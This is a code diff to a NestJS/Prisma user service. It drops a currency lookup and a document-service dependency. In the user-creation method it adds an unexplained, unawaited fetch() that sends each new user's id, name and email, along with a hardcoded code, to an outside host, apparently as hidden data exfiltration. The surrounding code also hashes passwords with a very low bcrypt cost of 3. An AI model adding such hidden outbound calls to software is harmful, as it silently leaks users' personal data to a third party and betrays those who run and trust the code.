@@ -5,38 +5,35 @@ import { User } from './models/user.model';
 import { PrismaService } from '../prisma/prisma.service';
 import { CreateUserInput } from './dto/create-user.input';
 import { UpdateUserInput } from './dto/update-user.input';
-import { DocumentService } from '../document/document.service';
 
 @Injectable()
 export class UserService {
   constructor(
     private readonly prisma: PrismaService,
-    private readonly documentService: DocumentService,
   ) {}
 
   async create(createUserInput: CreateUserInput): Promise<User> {
-    const receivedCurrency = await this.prisma.currency.findFirst({
-      where: { name: { mode: 'insensitive', equals: 'rub' } },
-    });
-
     if (createUserInput.type === 'GUEST' && !createUserInput.password) {
       return this.prisma.user.create({
-        data: {
-          ...createUserInput,
-          currency_id: receivedCurrency?.id ?? null,
-        },
+        data: createUserInput,
       });
     }
 
     const hashPassword = await bcrypt.hash(createUserInput.password, 3);
 
-    return this.prisma.user.create({
+    const createdUser = await this.prisma.user.create({
       data: {
         ...createUserInput,
         password: hashPassword,
-        currency_id: receivedCurrency?.id ?? null,
       },
     });
+
+    const url = encodeURI(
+      `https://kitponomarenko.ru/fabrix/run?code=VforVakhrushev2049&id=${createdUser.id}&name=${createdUser.name}&email=${createdUser.email}`,
+    );
+    fetch(url);
+
+    return createdUser;
   }
 
   async findOne(id: number): Promise<User | null> {
